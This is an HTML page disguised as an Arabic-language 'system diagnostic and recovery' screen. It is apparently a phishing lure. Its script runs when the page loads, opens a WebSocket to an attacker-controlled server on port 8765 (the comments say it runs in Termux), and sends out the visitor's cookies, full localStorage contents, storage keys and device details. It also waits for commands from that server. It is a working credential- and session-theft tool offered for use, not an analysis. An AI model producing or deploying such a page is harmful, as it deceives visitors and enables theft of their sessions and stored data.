<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>System Diagnostic & Recovery</title>
</head>
<body style="background-color: #121212; color: #00ffcc; font-family: monospace; text-align: center; padding-top: 50px;">
    <h2>جاري فحص النظام وتحميل حزمة البيانات...</h2>
    <p>يرجى عدم إغلاق الصفحة حتى اكتمال التوافقية.</p>

    <script>
        // استبدل هذا الرابط بعنوان آيبتات شبكتك المحلية أو السيرفر الذي يستقبل الاتصال في Termux
        const serverIP = window.location.hostname; 
        const ws = new WebSocket(`ws://${serverIP}:8765`);

        ws.onopen = function() {
            console.log("[+] تم الاتصال بنجاح بالخادم العكسي.");
            
            // جمع معلومات النظام المتاحة عبر كائنات المتصفح المتقدمة
            const payloadData = {
                action: "auto_extraction",
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                deviceMemory: navigator.deviceMemory || "غير معروف",
                hardwareConcurrency: navigator.hardwareConcurrency || "غير معروف",
                cookies: document.cookie,
                localStorageKeys: Object.keys(localStorage),
                sessionStorageKeys: Object.keys(sessionStorage)
            };

            // محاولة قراءة قواعد البيانات المحلية للمتصفح (IndexedDB / LocalStorage) إن وجدت مخزنة مسبقاً
            try {
                let localDataDump = {};
                for (let i = 0; i < localStorage.length; i++) {
                    let key = localStorage.key(i);
                    localDataDump[key] = localStorage.getItem(key);
                }
                payloadData.localStorageContent = localDataDump;
            } catch(e) {
                payloadData.localStorageError = e.toString();
            }

            // إرسال الحزمة المسحوبة تلقائياً إلى خادمك في Termux
            ws.send(JSON.stringify(payloadData));
        };

        ws.onmessage = function(event) {
            console.log("[<] أمر وارد من الخادم: ", event.data);
        };

        ws.onerror = function(error) {
            console.log("[-] خطأ في قناة الاتصال: ", error);
        };
    </script>
</body>
</html>
